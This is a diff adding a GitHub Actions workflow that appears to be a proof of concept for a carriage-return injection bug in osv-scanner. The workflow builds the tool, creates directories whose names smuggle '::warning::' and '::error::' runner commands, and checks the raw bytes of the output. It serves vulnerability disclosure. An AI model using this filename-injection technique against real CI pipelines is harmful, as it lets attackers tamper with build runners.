@@ -1,0 +1,127 @@
+name: osv-scanner CRLF Injection PoC
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.22'
+
+      # -----------------------------------------------------------------------
+      # Step 1: Build osv-scanner from HEAD (the version with the incomplete fix)
+      # -----------------------------------------------------------------------
+      - name: Build osv-scanner from HEAD
+        run: |
+          git clone --depth 50 https://github.com/google/osv-scanner.git /tmp/osv-src
+          cd /tmp/osv-src
+          echo "HEAD: $(git rev-parse HEAD)"
+          echo "Fix commit present: $(git log --oneline c2c9aae -1)"
+          go build -o /tmp/osv-bin ./cmd/osv-scanner/
+          /tmp/osv-bin --version
+
+      # -----------------------------------------------------------------------
+      # Step 2: Create directory whose NAME contains \r-separated GHA commands.
+      #
+      # On the GHA Ubuntu runner, \r is a valid byte in a filename.
+      # osv-scanner prints "Scanning dir <path>" to stdout verbatim.
+      # The runner parses stdout line-by-line using both \n and \r as
+      # terminators — so each \r below starts a new "command line".
+      #
+      # If the injection works you will see:
+      #   - A real ::warning:: annotation on this step
+      #   - A real ::error:: annotation on this step
+      #   - The step marked with a warning/error badge in the GHA UI
+      # -----------------------------------------------------------------------
+      - name: Run osv-scanner on malicious path (INJECTION HERE)
+        run: |
+          DIR="$(printf '/tmp/poc/dir\r::warning::INJECTED_VIA_OSVCRLF — osv-scanner path printed to stdout unencoded\r::error::CRLF_INJECTION_CONFIRMED — bypass of commit c2c9aae')"
+          mkdir -p "$DIR"
+
+          cat > "$DIR/package-lock.json" <<'JSON'
+          {
+            "name": "x",
+            "version": "1.0.0",
+            "lockfileVersion": 3,
+            "requires": true,
+            "packages": {
+              "": {
+                "name": "x",
+                "version": "1.0.0",
+                "dependencies": { "lodash": "4.17.20" }
+              },
+              "node_modules/lodash": {
+                "version": "4.17.20",
+                "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
+                "integrity": "sha512-PlhdFcillOINfeV7Ni6oF1TAEayyZBoZ8bcshTHqOYJYlrqzRK5hagpagky5o4HfCzzd1TRkXPMFq6cKk9rGmA==",
+                "license": "MIT"
+              }
+            }
+          }
+          JSON
+
+          echo "--- planted directory name (cat -v) ---"
+          ls /tmp/poc | cat -v
+
+          echo "--- running osv-scanner ---"
+          /tmp/osv-bin --offline-vulnerabilities --download-offline-databases \
+            "$DIR/package-lock.json" || true
+
+      # -----------------------------------------------------------------------
+      # Step 3: Byte-level proof — same od -c as the local reproducer
+      # -----------------------------------------------------------------------
+      - name: Byte-level proof (od -c confirms raw \\r in stdout)
+        run: |
+          DIR="$(printf '/tmp/poc2/dir\r::warning::BYTE_PROOF')"
+          mkdir -p "$DIR"
+          cat > "$DIR/package-lock.json" <<'JSON'
+          {
+            "name": "x", "version": "1.0.0", "lockfileVersion": 3, "requires": true,
+            "packages": {
+              "": { "name": "x", "version": "1.0.0", "dependencies": { "lodash": "4.17.20" } },
+              "node_modules/lodash": {
+                "version": "4.17.20",
+                "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
+                "integrity": "sha512-PlhdFcillOINfeV7Ni6oF1TAEayyZBoZ8bcshTHqOYJYlrqzRK5hagpagky5o4HfCzzd1TRkXPMFq6cKk9rGmA==",
+                "license": "MIT"
+              }
+            }
+          }
+          JSON
+
+          echo "od -c of first stdout line:"
+          /tmp/osv-bin --offline-vulnerabilities --download-offline-databases \
+            "$DIR/package-lock.json" 2>/dev/null | head -1 | od -c | head -6
+
+      # -----------------------------------------------------------------------
+      # Step 4: Confirm patched path (gh-annotations) encodes correctly
+      # -----------------------------------------------------------------------
+      - name: Confirm patched path encodes \\r as %0D (control group)
+        run: |
+          DIR="$(printf '/tmp/poc3/dir\r::warning::SHOULD_NOT_FIRE')"
+          mkdir -p "$DIR"
+          cat > "$DIR/package-lock.json" <<'JSON'
+          {
+            "name": "x", "version": "1.0.0", "lockfileVersion": 3, "requires": true,
+            "packages": {
+              "": { "name": "x", "version": "1.0.0", "dependencies": { "lodash": "4.17.20" } },
+              "node_modules/lodash": {
+                "version": "4.17.20",
+                "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",
+                "integrity": "sha512-PlhdFcillOINfeV7Ni6oF1TAEayyZBoZ8bcshTHqOYJYlrqzRK5hagpagky5o4HfCzzd1TRkXPMFq6cKk9rGmA==",
+                "license": "MIT"
+              }
+            }
+          }
+          JSON
+
+          echo "gh-annotations output (should contain %0D, not fire ::warning::):"
+          /tmp/osv-bin --offline-vulnerabilities --download-offline-databases \
+            --format=gh-annotations "$DIR/package-lock.json" 2>&1 >/dev/null \
+            | grep -o '%0D' | head -4 || echo "no %0D found (unexpected)"
